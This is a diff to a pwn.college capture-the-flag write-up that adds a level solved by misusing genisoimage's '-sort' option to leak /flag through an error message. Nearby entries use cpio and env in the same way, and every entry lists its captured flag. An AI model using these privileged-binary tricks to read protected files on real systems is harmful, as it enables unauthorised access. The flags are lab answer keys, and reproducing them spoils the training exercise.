@@ -102,6 +102,12 @@ echo "/flag" | /bin/cpio -R hacker -p /tmp/pwn
 cat /tmp/pwn/flag
 pwn.college{QA0disrgr2Wc5Ro9ffXdxUwF7n8.0FN2EDLwIzW}
 
+## Level23
+genisoimage --help 2>&1 | grep FILE
+/bin/genisoimage -sort /flag
+/bin/genisoimage: Incorrect sort file format
+pwn.college{Mf__hdRDiuQE0tlUGULVx-dla2M.0VN2EDLwIzW}
+
 ## Level24
 /bin/env -i cat /flag
 pwn.college{0uj9Z12xXk2h4Q1B2rJedYDXxBx.0lN2EDLwIzW}
